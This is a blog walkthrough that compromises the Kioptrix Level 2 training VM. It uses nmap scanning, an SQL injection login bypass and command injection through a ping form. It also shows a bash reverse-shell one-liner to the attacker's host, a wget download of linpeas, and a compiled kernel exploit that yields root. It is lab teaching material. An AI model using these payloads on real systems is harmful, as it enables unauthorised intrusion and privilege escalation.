<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Kioptrix Level 2 Walkthrough - AnTu97-6.io</title><meta name=Description content="Blog de AnTu97-6"><meta property="og:title" content="Kioptrix Level 2 Walkthrough"><meta property="og:description" content="Kioptrix Level 2 Setup By default the machine has the network card configured in Bridged mode and it is not recommended so we must configure it in NAT mode which has to be the same interface as our Kali.
To do this before opening the machine in our VMware we go to the configuration file. we open it with our text editor and change the network name to NAT
1 2 3 4 #change ethernet0."><meta property="og:type" content="article"><meta property="og:url" content="/en/kioptrix_level_2/"><meta property="og:image" content="/en/kioptrix_level_2/preimagenKioptrix2.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-08-22T00:00:00+00:00"><meta property="article:modified_time" content="2025-07-13T22:34:36+02:00"><meta property="og:site_name" content="AnTu97-6"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/en/kioptrix_level_2/preimagenKioptrix2.png"><meta name=twitter:title content="Kioptrix Level 2 Walkthrough"><meta name=twitter:description content="Kioptrix Level 2 Setup By default the machine has the network card configured in Bridged mode and it is not recommended so we must configure it in NAT mode which has to be the same interface as our Kali.
To do this before opening the machine in our VMware we go to the configuration file. we open it with our text editor and change the network name to NAT
1 2 3 4 #change ethernet0."><meta name=application-name content="AnTu97-6"><meta name=apple-mobile-web-app-title content="AnTu97-6"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=/en/kioptrix_level_2/><link rel=prev href=/en/kioptrix_level_1/><link rel=next href=/en/kioptrix_level_3/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Kioptrix Level 2 Walkthrough","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"\/en\/kioptrix_level_2\/"},"image":[{"@type":"ImageObject","url":"\/en\/kioptrix_level_2\/preimagenKioptrix2.png","width":674,"height":326}],"genre":"posts","keywords":"Walkthrough, Vulnhub, TjNull, OSCP, Easy","wordcount":1048,"url":"\/en\/kioptrix_level_2\/","datePublished":"2023-08-22T00:00:00+00:00","dateModified":"2025-07-13T22:34:36+02:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"Antu","logo":{"@type":"ImageObject","url":"\/images\/avatar.png","width":398,"height":292}},"author":{"@type":"Person","name":"Antu"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><head><script async src="https://www.googletagmanager.com/gtag/js?id=G-JZJ8R9MHR6"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-JZJ8R9MHR6",{anonymize_ip:!1})}</script><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","G-JZJ8R9MHR6","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></head><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/en/ title=AnTu97-6.io>AnTu97-6</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/en/posts>Posts </a><a class=menu-item href=/en/tags>Tags </a><a class=menu-item href=/en/categories>Categories </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="menu-item language" title="Select Language"><i class="fa fa-globe" aria-hidden=true></i>
<select class=language-select id=language-select-desktop onchange="location=this.value"><option value=/en/kioptrix_level_2/ selected>English</option><option value=/kioptrix_level_2/>Español</option></select></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/en/ title=AnTu97-6.io>AnTu97-6</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/en/posts title>Posts</a><a class=menu-item href=/en/tags title>Tags</a><a class=menu-item href=/en/categories title>Categories</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class=menu-item title="Select Language"><i class="fa fa-globe fa-fw" aria-hidden=true></i>
<select class=language-select onchange="location=this.value"><option value=/en/kioptrix_level_2/ selected>English</option><option value=/kioptrix_level_2/>Español</option></select></a></div></div></header><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class="toc-content always-active" id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Kioptrix Level 2 Walkthrough</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/en/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>Antu</a></span>&nbsp;<span class=post-category>included in <a href=/en/categories/vulnhub/><i class="far fa-folder fa-fw" aria-hidden=true></i>Vulnhub</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-08-22>2023-08-22</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;1048 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;5 minutes&nbsp;</div></div><div class=featured-image><img class=lazyload src=/svg/loading.min.svg data-src=/en/kioptrix_level_2/preimagenKioptrix2.png data-srcset="/en/kioptrix_level_2/preimagenKioptrix2.png, /en/kioptrix_level_2/preimagenKioptrix2.png 1.5x, /en/kioptrix_level_2/preimagenKioptrix2.png 2x" data-sizes=auto alt=/en/kioptrix_level_2/preimagenKioptrix2.png title=/en/kioptrix_level_2/preimagenKioptrix2.png></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#setup>Setup</a></li><li><a href=#machine-resolution>Machine Resolution</a><ul><li><a href=#scanning-and-vulnerability-analysis>Scanning and Vulnerability Analysis</a></li><li><a href=#explotation>Explotation</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></li></ul></nav></div></div><div class=content id=content><h1 id=kioptrix-level-2>Kioptrix Level 2</h1><h2 id=setup>Setup</h2><p>By default the machine has the network card configured in Bridged mode and it is not recommended so we must configure it in NAT mode which has to be the same interface as our Kali.</p><p>To do this before opening the machine in our VMware we go to the configuration file.
<img class=lazyload src=/svg/loading.min.svg data-src=/en/kioptrix_level_2/Untitled.png data-srcset="/en/kioptrix_level_2/Untitled.png, /en/kioptrix_level_2/Untitled.png 1.5x, /en/kioptrix_level_2/Untitled.png 2x" data-sizes=auto alt=/en/kioptrix_level_2/Untitled.png title=Untitled width=808 height=150></p><p>we open it with our text editor and change the network name to NAT</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/en/kioptrix_level_2/Untitled%201.png data-srcset="/en/kioptrix_level_2/Untitled%201.png, /en/kioptrix_level_2/Untitled%201.png 1.5x, /en/kioptrix_level_2/Untitled%201.png 2x" data-sizes=auto alt=/en/kioptrix_level_2/Untitled%201.png title=Untitled width=590 height=502></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>#change</span>
</span></span><span class=line><span class=cl>ethernet0.networkName <span class=o>=</span> <span class=s2>&#34;Bridged&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>#to</span>
</span></span><span class=line><span class=cl>ethernet0.networkName <span class=o>=</span> <span class=s2>&#34;NAT&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>Then we open the machine from VMware and change the network interface to NAT.
<img class=lazyload src=/svg/loading.min.svg data-src=/en/kioptrix_level_2/Untitled%202.png data-srcset="/en/kioptrix_level_2/Untitled%202.png, /en/kioptrix_level_2/Untitled%202.png 1.5x, /en/kioptrix_level_2/Untitled%202.png 2x" data-sizes=auto alt=/en/kioptrix_level_2/Untitled%202.png title=Untitled width=731 height=381></p><p>We start and a series of windows will appear in which we must select &ldquo;Do Nothing&rdquo; in all of them until the machine finishes starting.
<img class=lazyload src=/svg/loading.min.svg data-src=/en/kioptrix_level_2/Untitled%203.png data-srcset="/en/kioptrix_level_2/Untitled%203.png, /en/kioptrix_level_2/Untitled%203.png 1.5x, /en/kioptrix_level_2/Untitled%203.png 2x" data-sizes=auto alt=/en/kioptrix_level_2/Untitled%203.png title=Untitled width=659 height=351></p><p>And we should have the machine ready to start.</p><h2 id=machine-resolution>Machine Resolution</h2><h3 id=scanning-and-vulnerability-analysis>Scanning and Vulnerability Analysis</h3><p>We start with a scan with the arp command to obtain the ip of our machine.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo arp-scan -I eth0 --localnet
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/svg/loading.min.svg data-src=/en/kioptrix_level_2/Untitled%204.png data-srcset="/en/kioptrix_level_2/Untitled%204.png, /en/kioptrix_level_2/Untitled%204.png 1.5x, /en/kioptrix_level_2/Untitled%204.png 2x" data-sizes=auto alt=/en/kioptrix_level_2/Untitled%204.png title=Untitled width=746 height=250></p><p>Once we have obtained our IP address, we will perform a scan with nmap to discover open ports.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap -p- --open  -T5 -n -Pn -vvv 192.168.66.160 -oN Target
</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Starting Nmap 7.94 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-08-20 16:30 EDT
</span></span><span class=line><span class=cl>Initiating ARP Ping Scan at 16:30
</span></span><span class=line><span class=cl>Scanning 192.168.66.160 <span class=o>[</span><span class=m>1</span> port<span class=o>]</span>
</span></span><span class=line><span class=cl>Completed ARP Ping Scan at 16:30, 0.04s elapsed <span class=o>(</span><span class=m>1</span> total hosts<span class=o>)</span>
</span></span><span class=line><span class=cl>Initiating SYN Stealth Scan at 16:30
</span></span><span class=line><span class=cl>Scanning 192.168.66.160 <span class=o>[</span><span class=m>65535</span> ports<span class=o>]</span>
</span></span><span class=line><span class=cl>Discovered open port 111/tcp on 192.168.66.160
</span></span><span class=line><span class=cl>Discovered open port 3306/tcp on 192.168.66.160
</span></span><span class=line><span class=cl>Discovered open port 22/tcp on 192.168.66.160
</span></span><span class=line><span class=cl>Discovered open port 443/tcp on 192.168.66.160
</span></span><span class=line><span class=cl>Discovered open port 80/tcp on 192.168.66.160
</span></span><span class=line><span class=cl>Discovered open port 996/tcp on 192.168.66.160
</span></span><span class=line><span class=cl>Discovered open port 631/tcp on 192.168.66.160
</span></span><span class=line><span class=cl>Completed SYN Stealth Scan at 16:30, 4.05s elapsed <span class=o>(</span><span class=m>65535</span> total ports<span class=o>)</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.66.160
</span></span><span class=line><span class=cl>Host is up, received arp-response <span class=o>(</span>0.0025s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Scanned at 2023-08-20 16:30:10 EDT <span class=k>for</span> 4s
</span></span><span class=line><span class=cl>Not shown: <span class=m>65528</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE  REASON
</span></span><span class=line><span class=cl>22/tcp   open  ssh      syn-ack ttl <span class=m>64</span>
</span></span><span class=line><span class=cl>80/tcp   open  http     syn-ack ttl <span class=m>64</span>
</span></span><span class=line><span class=cl>111/tcp  open  rpcbind  syn-ack ttl <span class=m>64</span>
</span></span><span class=line><span class=cl>443/tcp  open  https    syn-ack ttl <span class=m>64</span>
</span></span><span class=line><span class=cl>631/tcp  open  ipp      syn-ack ttl <span class=m>64</span>
</span></span><span class=line><span class=cl>996/tcp  open  xtreelic syn-ack ttl <span class=m>64</span>
</span></span><span class=line><span class=cl>3306/tcp open  mysql    syn-ack ttl <span class=m>64</span>
</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:60:3D:BB <span class=o>(</span>VMware<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 4.24 seconds
</span></span><span class=line><span class=cl>           Raw packets sent: <span class=m>65536</span> <span class=o>(</span>2.884MB<span class=o>)</span> <span class=p>|</span> Rcvd: <span class=m>65536</span> <span class=o>(</span>2.621MB<span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><p>After a general scan, we will perform another one specifying the ports discovered to see which version of the services are running.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap -p22,80,111,443,631,996,3306 -sCV 192.168.66.160
</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Starting Nmap 7.94 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-08-20 16:31 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.66.160
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00015s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE  VERSION
</span></span><span class=line><span class=cl>22/tcp   open  ssh      OpenSSH 3.9p1 <span class=o>(</span>protocol 1.99<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_sshv1: Server supports SSHv1
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>1024</span> 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 <span class=o>(</span>RSA1<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>1024</span> 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 <span class=o>(</span>DSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>1024</span> 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp   open  http     Apache httpd 2.0.52 <span class=o>((</span>CentOS<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.0.52 <span class=o>(</span>CentOS<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Site doesn<span class=s1>&#39;t have a title (text/html; charset=UTF-8).
</span></span></span><span class=line><span class=cl><span class=s1>111/tcp  open  rpcbind  2 (RPC #100000)
</span></span></span><span class=line><span class=cl><span class=s1>| rpcinfo: 
</span></span></span><span class=line><span class=cl><span class=s1>|   program version    port/proto  service
</span></span></span><span class=line><span class=cl><span class=s1>|   100000  2            111/tcp   rpcbind
</span></span></span><span class=line><span class=cl><span class=s1>|   100000  2            111/udp   rpcbind
</span></span></span><span class=line><span class=cl><span class=s1>|   100024  1            993/udp   status
</span></span></span><span class=line><span class=cl><span class=s1>|_  100024  1            996/tcp   status
</span></span></span><span class=line><span class=cl><span class=s1>443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
</span></span></span><span class=line><span class=cl><span class=s1>|_http-title: Site doesn&#39;</span>t have a title <span class=o>(</span>text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>UTF-8<span class=o>)</span>.
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>localhost.localdomain/organizationName<span class=o>=</span>SomeOrganization/stateOrProvinceName<span class=o>=</span>SomeState/countryName<span class=o>=</span>--
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2009-10-08T00:10:47
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2010-10-08T00:10:47
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2023-08-20T17:22:36+00:00<span class=p>;</span> -3h09m37s from scanner time.
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.0.52 <span class=o>(</span>CentOS<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> sslv2: 
</span></span><span class=line><span class=cl><span class=p>|</span>   SSLv2 supported
</span></span><span class=line><span class=cl><span class=p>|</span>   ciphers: 
</span></span><span class=line><span class=cl><span class=p>|</span>     SSL2_RC2_128_CBC_WITH_MD5
</span></span><span class=line><span class=cl><span class=p>|</span>     SSL2_RC4_64_WITH_MD5
</span></span><span class=line><span class=cl><span class=p>|</span>     SSL2_DES_192_EDE3_CBC_WITH_MD5
</span></span><span class=line><span class=cl><span class=p>|</span>     SSL2_RC4_128_EXPORT40_WITH_MD5
</span></span><span class=line><span class=cl><span class=p>|</span>     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
</span></span><span class=line><span class=cl><span class=p>|</span>     SSL2_DES_64_CBC_WITH_MD5
</span></span><span class=line><span class=cl><span class=p>|</span>_    SSL2_RC4_128_WITH_MD5
</span></span><span class=line><span class=cl>631/tcp  open  ipp      CUPS 1.1
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: CUPS/1.1
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: <span class=m>403</span> Forbidden
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  Potentially risky methods: PUT
</span></span><span class=line><span class=cl>996/tcp  open  status   <span class=m>1</span> <span class=o>(</span>RPC <span class=c1>#100024)</span>
</span></span><span class=line><span class=cl>3306/tcp open  mysql    MySQL <span class=o>(</span>unauthorized<span class=o>)</span>
</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:60:3D:BB <span class=o>(</span>VMware<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: -3h09m37s
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 21.28 seconds
</span></span></code></pre></td></tr></table></div></div><h3 id=explotation>Explotation</h3><p>After analyzing the result we see that port 80 is open with the http service, so we go to see the web.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/en/kioptrix_level_2/Untitled%205.png data-srcset="/en/kioptrix_level_2/Untitled%205.png, /en/kioptrix_level_2/Untitled%205.png 1.5x, /en/kioptrix_level_2/Untitled%205.png 2x" data-sizes=auto alt=/en/kioptrix_level_2/Untitled%205.png title=Untitled width=954 height=269></p><p>We observe a login with Username and Password fields.</p><p>Let&rsquo;s try to perform a basic SQLInjection command on the Username field.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=err>&#39;</span> or <span class=nv>1</span> <span class=o>=</span> <span class=m>1</span> -- -
</span></span></code></pre></td></tr></table></div></div><p>And we are successful and the following window appears:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/en/kioptrix_level_2/Untitled%206.png data-srcset="/en/kioptrix_level_2/Untitled%206.png, /en/kioptrix_level_2/Untitled%206.png 1.5x, /en/kioptrix_level_2/Untitled%206.png 2x" data-sizes=auto alt=/en/kioptrix_level_2/Untitled%206.png title=Untitled width=647 height=188></p><p>We observe that it has the function of pinging the ip that we indicate. If we write the ip of the machine we obtain the following:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/en/kioptrix_level_2/Untitled%207.png data-srcset="/en/kioptrix_level_2/Untitled%207.png, /en/kioptrix_level_2/Untitled%207.png 1.5x, /en/kioptrix_level_2/Untitled%207.png 2x" data-sizes=auto alt=/en/kioptrix_level_2/Untitled%207.png title=Untitled width=585 height=284></p><p>We try to concatenate commands with a &ldquo;;&rdquo; and see that they can be concatenated:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>192.168.66.160 <span class=p>;</span> whoami
</span></span></code></pre></td></tr></table></div></div><p>result:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/en/kioptrix_level_2/Untitled%208.png data-srcset="/en/kioptrix_level_2/Untitled%208.png, /en/kioptrix_level_2/Untitled%208.png 1.5x, /en/kioptrix_level_2/Untitled%208.png 2x" data-sizes=auto alt=/en/kioptrix_level_2/Untitled%208.png title=Untitled width=494 height=214></p><p>Once here, we listen to our kali and execute the following command to get a reverse Shell</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>#kali</span>
</span></span><span class=line><span class=cl>nc -nlvp <span class=m>4444</span>
</span></span><span class=line><span class=cl><span class=c1>#En la web</span>
</span></span><span class=line><span class=cl>192.168.66.152 <span class=p>;</span> bash -i &gt;<span class=p>&amp;</span> /dev/tcp/192.168.66.152/4444 0&gt;<span class=p>&amp;</span><span class=m>1</span>
</span></span></code></pre></td></tr></table></div></div><p>result:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ nc -nlvp <span class=m>4444</span>                     
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>4444</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>192.168.66.152<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>192.168.66.160<span class=o>]</span> <span class=m>32779</span>
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>bash-3.00$ whoami
</span></span><span class=line><span class=cl>apache
</span></span></code></pre></td></tr></table></div></div><h3 id=privilege-escalation>Privilege Escalation</h3><p>We transfer <a href=https://github.com/carlospolop/PEASS-ng/releases target=_blank rel="noopener noreffer">linpeas.sh</a> from our Kali to the machine to see where we can escalate privileges, for this we start a server with Python in our Kali:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -m http.server <span class=m>80</span>
</span></span></code></pre></td></tr></table></div></div><p>and with wget from the machine we download Linpeas.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wget http://192.168.66.152/linpeas.sh
</span></span></code></pre></td></tr></table></div></div><p>Once we have Linpeas on the target machine we run it and we see the following:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/en/kioptrix_level_2/Untitled%209.png data-srcset="/en/kioptrix_level_2/Untitled%209.png, /en/kioptrix_level_2/Untitled%209.png 1.5x, /en/kioptrix_level_2/Untitled%209.png 2x" data-sizes=auto alt=/en/kioptrix_level_2/Untitled%209.png title=Untitled width=1101 height=163></p><p>The machine is a CentOS 4.5 with Linux version 2.6.9.</p><p>We searched Google to see if there is a privilege escalation exploit with these characteristics and found the following exploit:</p><p><a href=https://www.exploit-db.com/exploits/9542 target=_blank rel="noopener noreffer">https://www.exploit-db.com/exploits/9542</a></p><p>We download it to our machine and transfer it as we have done before.</p><p>Compile it</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gcc 9542.c -o exploit
</span></span></code></pre></td></tr></table></div></div><p>We give execution permissions</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>chmod +x exploit
</span></span></code></pre></td></tr></table></div></div><p>and run it getting a shell as root</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash-3.00$ ./exploit
</span></span><span class=line><span class=cl>sh: no job control in this shell
</span></span><span class=line><span class=cl>sh-3.00# whoami
</span></span><span class=line><span class=cl>root
